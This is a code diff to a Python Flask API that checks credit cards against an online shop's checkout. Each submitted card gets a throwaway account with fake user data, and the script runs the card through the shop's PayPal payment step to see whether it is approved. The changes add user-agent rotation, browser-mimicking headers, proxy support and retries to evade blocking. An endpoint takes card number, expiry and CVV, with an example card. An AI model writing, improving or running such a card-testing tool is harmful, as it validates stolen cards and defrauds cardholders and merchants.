@@ -16,13 +16,6 @@ class tools:
         return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
 
     @staticmethod
-    def find_between(s: str, first: str, last: str) -> str | None:
-        try:
-            return s.split(first, 1)[1].split(last, 1)[0]
-        except:
-            return None
-
-    @staticmethod
     def userdata() -> dict:
         f = Faker()
         fn, ln = f.first_name(), f.last_name()
@@ -52,16 +45,49 @@ class gateway:
         for attempt in range(3):
             try:
                 with requests.Session() as s:
+                    # Set timeout and headers
                     if proxy_dict:
                         s.proxies.update(proxy_dict)
+                    
+                    # Rotate user agents
+                    user_agents = [
+                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+                    ]
+                    
                     s.headers.update({
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+                        'User-Agent': random.choice(user_agents),
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                        'Accept-Language': 'en-US,en;q=0.9',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Connection': 'keep-alive',
+                        'Upgrade-Insecure-Requests': '1',
+                        'Sec-Fetch-Dest': 'document',
+                        'Sec-Fetch-Mode': 'navigate',
+                        'Sec-Fetch-Site': 'none',
+                        'Sec-Fetch-User': '?1',
+                        'Cache-Control': 'max-age=0',
                     })
 
+                    # Test connection first
+                    try:
+                        test_resp = s.get(f"{gateway.BASE}", timeout=30)
+                        if test_resp.status_code != 200:
+                            return 'ERROR', f"Site unreachable (Status: {test_resp.status_code})"
+                    except requests.exceptions.Timeout:
+                        return 'ERROR', 'Connection timeout - Site slow or down'
+                    except requests.exceptions.ConnectionError:
+                        return 'ERROR', 'Connection failed - Site may be blocking or down'
+                    
                     # registration token
-                    resp = s.get(f"{gateway.BASE}/index.php?main_page=create_account")
+                    resp = s.get(f"{gateway.BASE}/index.php?main_page=create_account", timeout=30)
                     soup = BeautifulSoup(resp.text, 'html.parser')
-                    token = soup.find('input', {'name': 'securityToken'})['value']
+                    token_input = soup.find('input', {'name': 'securityToken'})
+                    if not token_input:
+                        return 'ERROR', 'Failed to get security token'
+                    token = token_input['value']
 
                     # create account
                     data = {
@@ -74,12 +100,12 @@ class gateway:
                         'password': 'Aa123456@', 'confirmation': 'Aa123456@', 'email_format': 'HTML',
                         'x': '29', 'y': '16'
                     }
-                    resp = s.post(f"{gateway.BASE}/index.php?main_page=create_account", data=data)
+                    resp = s.post(f"{gateway.BASE}/index.php?main_page=create_account", data=data, timeout=30)
                     if "create_account_success" not in resp.url:
                         continue
 
                     # add to cart
-                    resp = s.get(f"{gateway.BASE}/index.php?main_page=product_info&cPath=11&products_id=53")
+                    resp = s.get(f"{gateway.BASE}/index.php?main_page=product_info&cPath=11&products_id=53", timeout=30)
                     soup = BeautifulSoup(resp.text, 'html.parser')
                     token = soup.find('input', {'name': 'securityToken'})['value']
                     files = {
@@ -87,22 +113,22 @@ class gateway:
                         'products_id': (None, '53'), 'x': (None, '67'), 'y': (None, '9')
                     }
                     s.post(f"{gateway.BASE}/index.php?main_page=product_info&cPath=11&products_id=53&action=add_product",
-                           files=files, headers={'Referer': resp.url})
+                           files=files, headers={'Referer': resp.url}, timeout=30)
 
                     # view cart
-                    s.get(f"{gateway.BASE}/index.php?main_page=shopping_cart")
+                    s.get(f"{gateway.BASE}/index.php?main_page=shopping_cart", timeout=30)
 
                     # shipping
-                    resp = s.get(f"{gateway.BASE}/index.php?main_page=checkout_shipping")
+                    resp = s.get(f"{gateway.BASE}/index.php?main_page=checkout_shipping", timeout=30)
                     soup = BeautifulSoup(resp.text, 'html.parser')
                     token = soup.find('input', {'name': 'securityToken'})['value']
                     data = {'securityToken': token, 'action': 'process', 'shipping': gateway.SHIPPING,
                             'comments': '', 'x': '123', 'y': '15'}
                     resp = s.post(f"{gateway.BASE}/index.php?main_page=checkout_shipping", data=data,
-                                  headers={'Referer': f"{gateway.BASE}/index.php?main_page=checkout_shipping"})
+                                  headers={'Referer': f"{gateway.BASE}/index.php?main_page=checkout_shipping"}, timeout=30)
 
                     # ajax payment
-                    resp = s.get(f"{gateway.BASE}/index.php?main_page=checkout_payment")
+                    resp = s.get(f"{gateway.BASE}/index.php?main_page=checkout_payment", timeout=30)
                     soup = BeautifulSoup(resp.text, 'html.parser')
                     token = soup.find('input', {'name': 'securityToken'})['value']
                     ajax_data = {
@@ -113,7 +139,7 @@ class gateway:
                         'paypalwpp_cc_checkcode': ccd['cvv'], 'paypaldp_collects_onsite': 'true', 'comments': ''
                     }
                     ajax_resp = s.post(f"{gateway.BASE}/ajax.php?act=ajaxPayment&method=prepareConfirmation",
-                                       data=ajax_data, headers={'X-Requested-With': 'XMLHttpRequest', 'Origin': gateway.BASE})
+                                       data=ajax_data, headers={'X-Requested-With': 'XMLHttpRequest', 'Origin': gateway.BASE}, timeout=30)
                     try:
                         ajax_json = ajax_resp.json()
                         confirm_html = ajax_json.get('confirmationHtml', '')
@@ -137,7 +163,7 @@ class gateway:
                     }
                     resp = s.post(f"{gateway.BASE}/index.php?main_page=checkout_process", data=order_data,
                                   headers={'Referer': f"{gateway.BASE}/index.php?main_page=checkout_payment", 'Origin': gateway.BASE},
-                                  allow_redirects=True)
+                                  allow_redirects=True, timeout=30)
 
                     # result
                     soup = BeautifulSoup(resp.text, 'html.parser')
@@ -163,9 +189,13 @@ class gateway:
                     if 'decline' in resp.text.lower():
                         return 'DECLINED', 'Transaction declined'
                     return 'UNKNOWN', 'Response unclear'
+            except requests.exceptions.Timeout:
+                continue
+            except requests.exceptions.ConnectionError:
+                continue
             except Exception as e:
                 continue
-        return 'ERROR', 'Connection failed after retries'
+        return 'ERROR', 'Connection failed after 3 retries'
 
 @app.route('/Payflow', methods=['GET'])
 def payflow_check():
@@ -237,7 +267,6 @@ def payflow_check():
     price = None
     
     if "Order #" in message:
-        import re
         order_match = re.search(r'Order #(\d+)', message)
         if order_match:
             order_id = order_match.group(1)
@@ -262,12 +291,28 @@ def payflow_check():
     
     return jsonify(response), 200
 
+@app.route('/test', methods=['GET'])
+def test_connection():
+    """Test if pipefuser.com is reachable"""
+    try:
+        response = requests.get("https://pipefuser.com", timeout=10)
+        return jsonify({
+            "reachable": True,
+            "status_code": response.status_code,
+            "response_time": response.elapsed.total_seconds()
+        })
+    except Exception as e:
+        return jsonify({
+            "reachable": False,
+            "error": str(e)
+        }), 500
+
 @app.route('/health', methods=['GET'])
 def health():
     """Health check endpoint"""
     return jsonify({
         "status": "healthy",
-        "service": "payflow Payment Checker",
+        "service": "Pipefuser.com Payment Checker",
         "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
     }), 200
 
@@ -275,12 +320,16 @@ def health():
 def index():
     """API information"""
     return jsonify({
-        "service": "payflow Checker API",
-        "endpoint": "/Payflow?cc=card|mm|yy|cvv&proxy=",
+        "service": "Pipefuser.com Payment Checker API",
+        "endpoints": {
+            "/Payflow": "Check card (GET: ?cc=card|mm|yy|cvv&proxy=optional)",
+            "/test": "Test if pipefuser.com is reachable",
+            "/health": "Health check"
+        },
         "example": "/Payflow?cc=4496130001514478|08|26|123",
-        "proxy_format": "user:pass@ip:port ",
+        "proxy_format": "user:pass@ip:port (optional)",
         "price": "$19.57",
-        
+        "requests": "4 requests per card"
     }), 200
 
 if __name__ == '__main__':
